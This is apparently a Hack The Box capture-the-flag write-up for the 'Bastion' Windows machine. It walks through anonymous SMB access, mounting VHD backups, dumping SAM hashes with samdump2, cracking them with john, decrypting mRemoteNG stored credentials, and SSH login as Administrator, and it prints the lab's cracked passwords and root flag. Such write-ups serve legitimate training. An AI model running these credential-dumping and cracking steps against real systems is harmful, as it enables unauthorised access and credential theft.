# HTB - Bastion 10.10.10.134


- Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)

- Mount SMB
- Mount vhd
- Extract SAM
- john NTLM with rockyou
- find mRemoteNG config file
- crack stored password



## Nmap

```
# nmap -A -sC -sV 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 19:51 CEST
Nmap scan report for 10.10.10.134
Host is up (0.031s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -47m44s, deviation: 1h09m16s, median: -7m45s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-06T19:44:33+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-06 19:44:36
|_  start_date: 2019-09-06 10:50:12

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   30.19 ms 10.10.14.1
2   30.51 ms 10.10.10.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.52 seconds
```


## SMB

Try samba without credentials

```
# smbclient -L 10.10.10.134
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Try to read all Shares
```
# smbclient //10.10.10.134/ADMIN$
Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Ko

```
# smbclient //10.10.10.134/Backups
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep  6 11:07:15 2019
  ..                                  D        0  Fri Sep  6 11:07:15 2019
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 13:44:02 2019

		7735807 blocks of size 4096. 2755647 blocks available
smb: \> get note.txt 
getting file \note.txt of size 116 as note.txt (0,9 KiloBytes/sec) (average 0,9 KiloBytes/sec)
smb: \> get SDT65CB.tmp 
getting file \SDT65CB.tmp of size 0 as SDT65CB.tmp (0,0 KiloBytes/sec) (average 0,5 KiloBytes/sec)
smb: \> get WindowsImageBackup\
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \WindowsImageBackup\


smb: \> recurse
smb: \> mget WindowsImageBackup*
Get directory WindowsImageBackup? y
Get directory L4mpje-PC? y
Get directory Backup 2019-02-22 124351? y
Get file 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd? y
getting file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd of size 37761024 as 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (2745,6 KiloBytes/sec) (average 2745,6 KiloBytes/sec)
Get file 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd? y
```
Too large files...
Mount instead of download...

```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

```
# apt-get install cifs-utils
# mkdir /mnt/local_share
# mount -t cifs  //10.10.10.134/Backups /mnt/local_share
```
Identify files
```
ls /mnt/local_share/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd

ls /mnt/local_share/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd 
'/mnt/local_share/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd'
```

## Mount both vhd

```
# apt-get install libguestfs-tools
# mkdir /mnt/vhd
guestmount --add /mnt/local_share/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
```
First one is empty
```
guestmount --add /mnt/local_share/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
cd /mnt/vhd/Windows/System32/config
# samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

.\hashcat64.exe -m1000 .\hash.txt .\rockyou.txt
Not tested

```
# john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (?)
1g 0:00:00:03 DONE (2019-09-06 21:33) 0.3225g/s 3030Kp/s 3030Kc/s 3030KC/s bureauofcustoms..bure9691
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## ssh

```
ssh L4mpje@10.10.10.134   (password bureaulampje)
Microsoft Windows [Version 10.0.14393]                                                                            
(c) 2016 Microsoft Corporation. All rights reserved.                                                              
l4mpje@BASTION C:\Users\L4mpje>whoami                                                                             bastion\l4mpje                                                                                                    
l4mpje@BASTION C:\Users\L4mpje>systeminfo                                                     
ERROR: Access denied        

type DEsktop\user.txt
xxxxxxxxxxxxxxxxxxxxxxx
```

### nRemoteNG

```>cd "Program Files (x86)"                                                                                     
l4mpje@BASTION C:\Program Files (x86)>dir                                                                         
 Volume in drive C has no label.                                                                                  Volume Serial Number is 0CB3-C487                                                                                
 Directory of C:\Program Files (x86)                                                                              

22-02-2019  15:01    <DIR>          .                                                                             
22-02-2019  15:01    <DIR>          ..                                                                            
16-07-2016  15:23    <DIR>          Common Files                                                                  
23-02-2019  10:38    <DIR>          Internet Explorer                                                             
16-07-2016  15:23    <DIR>          Microsoft.NET                                                                               
22-02-2019  15:01    <DIR>          mRemoteNG                                                                                   
23-02-2019  11:22    <DIR>          Windows Defender                                                              
...                                                                       
               0 File(s)              0 bytes                                  
              14 Dir(s)  11.286.409.216 bytes free                      
```

mRemoteNG . It is an open source remote connections management tool. But there is a problem that the connections user information can be obtained by the config files. For this box, someone has created a tool to crack the password in this config file. The config file is store is the AppData folder. 

```type confCons.xml                                                      
<?xml version="1.0" encoding="utf-8"?>                                                                                          
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                      
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire
ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" 
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
" InheritRDGatewayDomain="false" />                                                                                             
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" 
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
eritRDGatewayDomain="false" />                                                                                                  
</mrng:Connections>                                                                                                             
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>                                                                       
```


```

me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

# python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2

```
# ssh Administrator@10.10.10.134
C:\Users\Administrator\Desktop>type root.txt                                                              
958850b91811676ed6620a9c430e65c8       
```